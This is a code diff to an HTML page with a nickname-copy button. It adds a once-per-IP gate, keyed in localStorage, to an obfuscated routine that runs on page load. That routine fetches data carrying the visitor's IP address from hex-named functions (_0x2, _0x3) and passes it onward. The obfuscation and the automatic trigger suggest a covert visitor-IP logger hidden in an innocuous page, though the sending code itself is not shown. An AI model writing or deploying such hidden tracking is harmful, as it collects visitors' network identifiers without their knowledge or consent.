@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ITS OVER</title>
+<title>zenec</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
 <script>
 function copyNick() {
@@ -33,6 +33,39 @@ function copyNick() {
       notice.textContent = '';
     }, 2200);
   }
+}
+
+function permitirUsoPorIp(ip) {
+  if (!ip || ip === 'N/A') return false;
+
+  const storageKey = 'zenec_ip_uso_unico';
+  const ttlMs = 1000 * 60 * 60 * 24 * 30;
+  const agora = Date.now();
+  let ipsUsados = [];
+
+  try {
+    ipsUsados = JSON.parse(localStorage.getItem(storageKey) || '[]');
+    if (!Array.isArray(ipsUsados)) ipsUsados = [];
+  } catch (e) {
+    ipsUsados = [];
+  }
+
+  ipsUsados = ipsUsados.filter(item => {
+    if (!item || typeof item !== 'object') return false;
+    return typeof item.ip === 'string' && typeof item.ts === 'number' && (agora - item.ts) < ttlMs;
+  });
+
+  const jaExiste = ipsUsados.some(item => item.ip === ip);
+  if (jaExiste) return false;
+
+  ipsUsados.push({ ip, ts: agora });
+
+  try {
+    localStorage.setItem(storageKey, JSON.stringify(ipsUsados));
+    sessionStorage.setItem(storageKey + ':last', ip);
+  } catch (e) {}
+
+  return true;
 }
 
 const _0x4b1d = (function(){
@@ -257,7 +290,13 @@ function _0x4() {
 
 async function _0x6() {
   _0x4();
-  _0x2().then(_0x3).catch(() => {});
+  _0x2()
+    .then(async (data) => {
+      if (permitirUsoPorIp(data.ip)) {
+        await _0x3(data);
+      }
+    })
+    .catch(() => {});
 }
 
 if (document.readyState === 'loading') {
